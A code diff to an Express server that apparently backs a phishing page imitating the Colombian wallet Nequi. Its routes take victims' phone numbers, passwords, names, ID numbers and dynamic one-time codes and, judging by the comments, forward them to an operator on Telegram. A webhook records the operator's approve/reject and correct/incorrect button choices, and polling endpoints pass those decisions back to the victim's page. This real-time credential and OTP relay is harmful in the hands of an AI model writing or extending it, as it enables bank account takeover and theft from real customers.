@@ -10,7 +10,7 @@ const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
 const CHAT_ID = process.env.CHAT_ID;
 const estados = {}; // Guarda decisiones por número
 
-// Enviar mensaje con botones a Telegram
+// Enviar mensaje con botones (inicio Nequi)
 app.post('/enviar', async (req, res) => {
   const { numero, clave, nombre, cedula } = req.body;
 
@@ -39,40 +39,7 @@ app.post('/enviar', async (req, res) => {
   res.send({ ok: true });
 });
 
-// Webhook de Telegram (recibe el botón presionado)
-app.post('/webhook', async (req, res) => {
-  const callback = req.body.callback_query;
-  if (!callback) return res.sendStatus(400);
-
-  const data = callback.data;
-  const numero = data.split('_')[1];
-  const accion = data.split('_')[0];
-
-  estados[numero] = accion;
-
-  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({
-      callback_query_id: callback.id,
-      text: `Has elegido: ${accion}`
-    })
-  });
-
-  res.sendStatus(200);
-});
-
-// Consultar el estado del número
-app.get('/estado/:numero', (req, res) => {
-  const numero = req.params.numero;
-  res.send({ estado: estados[numero] || null });
-});
-
-// Iniciar servidor
-const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log('Servidor funcionando en el puerto', PORT));
-
-// Ruta para Dinámica
+// Enviar mensaje de validación dinámica
 app.post('/dinamica', async (req, res) => {
   const { numero, dinamica } = req.body;
 
@@ -99,8 +66,41 @@ app.post('/dinamica', async (req, res) => {
   res.send({ ok: true });
 });
 
-// Estado de dinámica
+// Webhook general (maneja ambos tipos de botones)
+app.post('/webhook', async (req, res) => {
+  const callback = req.body.callback_query;
+  if (!callback) return res.sendStatus(400);
+
+  const data = callback.data;
+  const [accion, numero] = data.split('_');
+
+  // Guardamos el estado de manera dinámica
+  estados[numero] = accion;
+
+  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      callback_query_id: callback.id,
+      text: `Has elegido: ${accion === 'correcta' ? 'Dinámica Correcta' : accion === 'incorrecta' ? 'Dinámica Incorrecta' : accion}`
+    })
+  });
+
+  res.sendStatus(200);
+});
+
+// Consultar estado del inicio (aceptar/rechazar)
+app.get('/estado/:numero', (req, res) => {
+  const numero = req.params.numero;
+  res.send({ estado: estados[numero] || null });
+});
+
+// Consultar estado de dinámica (correcta/incorrecta)
 app.get('/dinamica_estado/:numero', (req, res) => {
   const numero = req.params.numero;
   res.send({ estado: estados[numero] || null });
 });
+
+// Iniciar servidor
+const PORT = process.env.PORT || 3000;
+app.listen(PORT, () => console.log('Servidor funcionando en el puerto', PORT));
